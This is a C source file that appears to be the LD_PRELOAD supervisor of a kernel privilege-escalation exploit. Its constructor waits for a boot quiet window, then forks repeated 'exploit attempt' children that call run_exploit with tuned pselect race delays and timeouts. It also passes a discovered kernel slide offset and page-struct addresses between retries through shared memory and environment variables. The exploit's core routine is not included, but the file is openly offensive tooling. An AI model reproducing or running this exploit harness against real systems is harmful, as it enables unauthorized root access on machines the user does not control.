#include "common.h"

#ifndef DEFAULT_EXPLOIT_ATTEMPTS
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define DEFAULT_EXPLOIT_ATTEMPTS 24
#else
#define DEFAULT_EXPLOIT_ATTEMPTS 16
#endif
#endif
#define DEFAULT_PSELECT_DELAY_USEC 20000
#ifndef DEFAULT_ATTEMPT_TIMEOUT_SEC
#define DEFAULT_ATTEMPT_TIMEOUT_SEC 90
#endif
#ifndef DEFAULT_P0_ATTEMPT_TIMEOUT_SEC
#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 20
#endif
#define APP_MIN_BOOT_UPTIME_SEC 120

#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
struct app_p0_shared_state {
  atomic_int dirty;
  atomic_int ready;
  _Atomic uintptr_t offset;
  _Atomic uintptr_t gate_page_struct;
  _Atomic uintptr_t probe_page_struct;
};

static struct app_p0_shared_state *app_p0_state;

void app_publish_p0_offset(uintptr_t offset) {
  if (!app_p0_state) {
    return;
  }
  atomic_store(&app_p0_state->gate_page_struct, p0_gate_page_struct);
  atomic_store(&app_p0_state->probe_page_struct, p0_probe_page_struct);
  atomic_store(&app_p0_state->offset, offset);
  atomic_store(&app_p0_state->ready, 1);
}

void app_publish_p0_dirty(void) {
  if (!app_p0_state) {
    return;
  }
  atomic_store(&app_p0_state->gate_page_struct, p0_gate_page_struct);
  atomic_store(&app_p0_state->probe_page_struct, p0_probe_page_struct);
  atomic_store(&app_p0_state->dirty, 1);
}

#endif

static int env_int(const char *name, int fallback, int min, int max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }

  char *end = NULL;
  errno = 0;
  long parsed = strtol(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    return fallback;
  }
  return (int)parsed;
}

static int attempt_delay_usec(int base_delay, int attempt) {
#if defined(APP_PAYLOAD_ATTEMPT_DELAYS_USEC)
  static const int delays[] = {
    APP_PAYLOAD_ATTEMPT_DELAYS_USEC
  };
  (void)base_delay;
  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  int delay = delays[(attempt - 1) % count];
#else
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  static const int offsets[] = {
    5000, 0, 10000, 30000, -5000, 20000, 15000, 25000,
  };
#else
  static const int offsets[] = {
    0, 10000, 30000, 5000, 20000, -5000, 40000, 15000,
  };
#endif
  int count = (int)(sizeof(offsets) / sizeof(offsets[0]));
  int delay = base_delay + offsets[(attempt - 1) % count];
#endif
  return delay < 0 ? 0 : delay;
}

static void wait_for_boot_quiet_window(void) {
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  struct timespec uptime;
  SYSCHK(clock_gettime(CLOCK_BOOTTIME, &uptime));
  if (uptime.tv_sec < APP_MIN_BOOT_UPTIME_SEC) {
    time_t wait_sec = APP_MIN_BOOT_UPTIME_SEC - uptime.tv_sec;
    pr_info("waiting for boot allocator quiet window seconds=%lld uptime=%lld\n",
            (long long)wait_sec, (long long)uptime.tv_sec);
    while (wait_sec > 0) {
      wait_sec = sleep((unsigned int)wait_sec);
    }
  }
#endif
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;
  set_unbuffer();
  wait_for_boot_quiet_window();

  int max_attempts = env_int(
      "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
  int base_delay = env_int(
      "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
  int attempt_timeout_sec = env_int(
      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 5, 900);
  int p0_attempt_timeout_sec = env_int(
      "P0_ATTEMPT_TIMEOUT_SEC", DEFAULT_P0_ATTEMPT_TIMEOUT_SEC, 5,
      attempt_timeout_sec);
  if (p0_attempt_timeout_sec > attempt_timeout_sec) {
    p0_attempt_timeout_sec = attempt_timeout_sec;
  }
  if (getenv("SLIDE_ONLY")) {
    max_attempts = 1;
  }

#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
  app_p0_state = mmap(NULL, sizeof(*app_p0_state), PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (app_p0_state == MAP_FAILED) {
    pr_error("app p0 shared state mmap failed errno=%d\n", errno);
    _exit(1);
  }
#endif

  unsetenv("LD_PRELOAD");
  char *argv[] = {"preload.so", NULL};

  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d "
             "p0_timeout=%d timeout=%d\n",
             getpid(), max_attempts, base_delay, p0_attempt_timeout_sec,
             attempt_timeout_sec);

  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    int delay_usec = attempt_delay_usec(base_delay, attempt);
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
      if (getppid() == 1) {
        _exit(1);
      }
      char delay[16];
      snprintf(delay, sizeof(delay), "%d", delay_usec);
      SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
      const char *forced_offset = getenv("SLIDE_P0_OFFSET");
      if (forced_offset) {
        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s\n",
                   attempt, max_attempts, getpid(), delay_usec,
                   forced_offset);
      } else {
        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=scan\n",
                   attempt, max_attempts, getpid(), delay_usec);
      }
#else
      pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
                 attempt, max_attempts, getpid(), delay_usec);
#endif
      _exit(run_exploit(1, argv));
    }

    int status = 0;
    pid_t waited = 0;
    struct timespec started;
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &started));
    for (;;) {
      waited = waitpid(child, &status, WNOHANG);
      if (waited == child) {
        break;
      }
      if (waited < 0 && errno != EINTR) {
        break;
      }

      struct timespec now;
      SYSCHK(clock_gettime(CLOCK_MONOTONIC, &now));
      time_t elapsed = now.tv_sec - started.tv_sec;
      int timeout_sec = attempt_timeout_sec;
#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
      if (!getenv("SLIDE_P0_OFFSET") &&
          !atomic_load(&app_p0_state->ready)) {
        timeout_sec = p0_attempt_timeout_sec;
      }
#endif
      if (elapsed >= timeout_sec) {
        pr_warning("exploit attempt=%d/%d timeout pid=%d seconds=%d\n",
                   attempt, max_attempts, child, timeout_sec);
        SYSCHK(kill(child, SIGKILL));
        do {
          waited = waitpid(child, &status, 0);
        } while (waited < 0 && errno == EINTR);
        break;
      }
      usleep(100000);
    }
    if (waited < 0) {
      pr_error("waitpid attempt=%d pid=%d errno=%d\n",
               attempt, child, errno);
    }
    if (waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
      pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
      return;
    }

#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
    if (!getenv("SLIDE_P0_OFFSET") &&
        atomic_load(&app_p0_state->ready)) {
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
      pr_error("fresh P0 session was consumed by the failed child; "
               "refusing cross-process retry, reboot required\n");
      break;
#else
      uintptr_t offset = atomic_load(&app_p0_state->offset);
      uintptr_t gate_page = atomic_load(&app_p0_state->gate_page_struct);
      uintptr_t probe_page = atomic_load(&app_p0_state->probe_page_struct);
      char offset_arg[16];
      char gate_page_arg[24];
      char probe_page_arg[24];
      snprintf(offset_arg, sizeof(offset_arg), "0x%zx", offset);
      snprintf(gate_page_arg, sizeof(gate_page_arg), "0x%zx", gate_page);
      snprintf(probe_page_arg, sizeof(probe_page_arg), "0x%zx", probe_page);
      SYSCHK(setenv("SLIDE_P0_OFFSET", offset_arg, 1));
      SYSCHK(setenv("P0_GATE_PAGE_STRUCT", gate_page_arg, 1));
      SYSCHK(setenv("P0_PROBE_PAGE_STRUCT", probe_page_arg, 1));
      pr_success("supervisor retained p0_offset=%s gate=%s probe=%s\n",
                 offset_arg, gate_page_arg, probe_page_arg);
#endif
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    } else if (!getenv("SLIDE_P0_OFFSET") &&
               atomic_load(&app_p0_state->dirty)) {
      pr_error("p0 oracle dirtied before slide discovery; refusing unsafe retry\n");
#else
    } else if (atomic_load(&app_p0_state->dirty)) {
      pr_error("p0 oracle state dirty or uncertain; refusing unsafe retry\n");
#endif
      break;
    }
#endif

    if (WIFSIGNALED(status)) {
      pr_warning("exploit attempt=%d/%d terminated signal=%d\n",
                 attempt, max_attempts, WTERMSIG(status));
    } else {
      pr_warning("exploit attempt=%d/%d failed status=%d\n",
                 attempt, max_attempts,
                  WIFEXITED(status) ? WEXITSTATUS(status) : status);
    }
#if defined(APP_PAYLOAD) && APP_PAYLOAD
    if (attempt < max_attempts) {
      pr_info("safe retry quiet delay seconds=5\n");
      sleep(5);
    }
#endif
  }

  pr_error("exploit failed after %d independent attempts\n", max_attempts);
  _exit(1);
}
